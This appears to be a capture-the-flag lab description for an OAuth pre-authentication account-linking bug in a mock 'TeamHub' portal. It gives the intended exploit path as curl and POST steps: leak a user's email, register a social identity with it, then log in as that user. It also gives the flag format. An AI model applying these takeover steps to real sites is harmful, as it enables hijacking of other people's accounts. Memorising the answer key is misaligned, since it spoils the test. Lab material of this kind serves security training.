# oauth/pre-auth-linking — PreAuthLinking (identity-gated, high)

**TeamHub** collaboration portal + social SSO ("HubID" mini-AS). Public team directory at `/team`.
**Bug:** email is used as an identity key without any verification. The SSO callback resolves the account to log into by **email match** against the (unverified) social identity's email, and client registration **merges** credentials onto the account owning the email.

## Intended path
1. Find the innocent's email: open `/team`, then `curl http://victim.target.lab:8119/api/profile/<innocent-username>` (directory leak).
2. Register a social identity carrying the innocent's email: `POST /social/register` `{"email":"<innocent email>","name":"attacker","password":"p"}` (auto-signs you in at the AS).
3. SSO-login at the client with it: open `http://victim.target.lab:8119/login` — the callback exchanges the code, matches accounts **by email**, and links your social sub to the innocent's TeamHub account (you are even logged in as them).
4. `curl http://victim.target.lab:8119/flag` — gate: `linked_identities` contains a row linking the innocent account to a social sub that is not its own.

Secondary demo of the same root cause: `POST /app/register` with the innocent's email merges your new username/password onto the innocent's account.

**Flag:** `DSLTV{OAUTH-PreAuthLinking-<9 digits>}` (only from `/flag`).
